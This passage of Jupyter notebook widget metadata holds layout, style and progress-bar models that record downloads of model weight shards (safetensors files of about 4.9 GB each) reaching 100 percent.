            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "ecaa8b7ff0504a79be4ec1832f78c2d9": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "34a92a4cf794416ab5501e16966a9488": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "a074f26fcb9b40b49ca8d043df979a7d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "adb9c1aa3baf4f27819f0e83259fff45": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_2c46844b7d234fa2a709e027d5a91372",
              "IPY_MODEL_7b77234f11af4f3b9e838ab17723be2f",
              "IPY_MODEL_c679004282f74b70bb84dfc5b122a821"
            ],
            "layout": "IPY_MODEL_75c6b7c4bf764b25b44c0c075c880ad4"
          }
        },
        "2c46844b7d234fa2a709e027d5a91372": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_56fb27f2ab0a4f1e9d6aa8e52382eba3",
            "placeholder": "​",
            "style": "IPY_MODEL_78f658e9617f4fd6ae49a654ba0f6968",
            "value": "model-00001-of-00004.safetensors: 100%"
          }
        },
        "7b77234f11af4f3b9e838ab17723be2f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_5ce8ab88b5fe4908a77a42ebf708e966",
            "max": 4902257696,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_c34c58debf924288a938ce2278d5c7fe",
            "value": 4902257696
          }
        },
        "c679004282f74b70bb84dfc5b122a821": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_9f137612a9724245a73d201883afbd8e",
            "placeholder": "​",
            "style": "IPY_MODEL_37948a2d7bd645a78dc7a88f44a73ed9",
            "value": " 4.90G/4.90G [11:17&lt;00:00, 66.9MB/s]"
          }
        },
        "75c6b7c4bf764b25b44c0c075c880ad4": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "56fb27f2ab0a4f1e9d6aa8e52382eba3": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "78f658e9617f4fd6ae49a654ba0f6968": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "5ce8ab88b5fe4908a77a42ebf708e966": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "c34c58debf924288a938ce2278d5c7fe": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "9f137612a9724245a73d201883afbd8e": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "37948a2d7bd645a78dc7a88f44a73ed9": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "09507f41b8d94d1ea48b13c4c3e35a31": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_c49970267f284ed6b968044662527b71",
              "IPY_MODEL_a7709502745347b697427a54102e9d16",
              "IPY_MODEL_4e2021d396e340a2812e05c1cd38d09f"
            ],
            "layout": "IPY_MODEL_ef8a9c65e5db4559b5f9c516c5fea87a"
          }
        },
        "c49970267f284ed6b968044662527b71": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_74b5f1d3795a4698b963241b0f8f5091",
            "placeholder": "​",
            "style": "IPY_MODEL_3dadcdb069174df3961d8a1dc6498b6d",
            "value": "model-00002-of-00004.safetensors: 100%"
          }
        },
        "a7709502745347b697427a54102e9d16": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_ae5e8460b2cd410caf01295315672c97",
            "max": 4915960368,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_dcf335ffef954e9dabaf3d1254636044",
            "value": 4915960368
          }
        },
        "4e2021d396e340a2812e05c1cd38d09f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_ba0045b3968d4da3b53456522a6ba6ef",
            "placeholder": "​",
            "style": "IPY_MODEL_921a0ac037c141508afb5b32bb321b07",
            "value": " 4.92G/4.92G [11:16&lt;00:00, 110MB/s]"
          }
        },
        "ef8a9c65e5db4559b5f9c516c5fea87a": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "74b5f1d3795a4698b963241b0f8f5091": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "3dadcdb069174df3961d8a1dc6498b6d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "ae5e8460b2cd410caf01295315672c97": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "dcf335ffef954e9dabaf3d1254636044": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "ba0045b3968d4da3b53456522a6ba6ef": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "921a0ac037c141508afb5b32bb321b07": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "734952231f1b42b5936c6ea8ff7c6061": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_1ca7b3097dd3440a88bfed2396d7eac0",
              "IPY_MODEL_de6a5378958c42c9bd4ac27588824dfd",
              "IPY_MODEL_66b394e4f7f94f3c89920747ba399caa"
            ],
            "layout": "IPY_MODEL_e39ad37d07a249be9b28ac31c3ec02dc"
          }
        },
        "1ca7b3097dd3440a88bfed2396d7eac0": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_fcf77173426448359afa262bf551d282",
            "placeholder": "​",
            "style": "IPY_MODEL_b6b57166e2d04aa19dc0cf56bf7e0005",
            "value": "model-00003-of-00004.safetensors: 100%"
          }
        },
        "de6a5378958c42c9bd4ac27588824dfd": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_0ee46cc9cdbf4ba88b9f1a4eb9cb4ea9",
            "max": 4983068496,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_0bd89a7cf2f948b781c3075ee80fc339",
            "value": 4983068496
          }
        },
        "66b394e4f7f94f3c89920747ba399caa": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_24d778e1df914cd89bd2a884a54cfb38",
            "placeholder": "​",
            "style": "IPY_MODEL_63f783ebaf6d4a34be7709978fb901a7",
            "value": " 4.98G/4.98G [11:20&lt;00:00, 295MB/s]"
          }
        },
        "e39ad37d07a249be9b28ac31c3ec02dc": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "fcf77173426448359afa262bf551d282": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "b6b57166e2d04aa19dc0cf56bf7e0005": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "0ee46cc9cdbf4ba88b9f1a4eb9cb4ea9": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "0bd89a7cf2f948b781c3075ee80fc339": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "24d778e1df914cd89bd2a884a54cfb38": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "63f783ebaf6d4a34be7709978fb901a7": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "19281b9e75d0413e801cdfb087d61b27": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_ae93ae9686f94de1b7c9afecd7bf4e72",
              "IPY_MODEL_507123fc2446446f8036b352f3b4daa8",
              "IPY_MODEL_ff78da02a8174d6f8853e72720579da3"
            ],
            "layout": "IPY_MODEL_3d29d415223140e1a15c166f06d09c8c"
          }
        },
        "ae93ae9686f94de1b7c9afecd7bf4e72": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
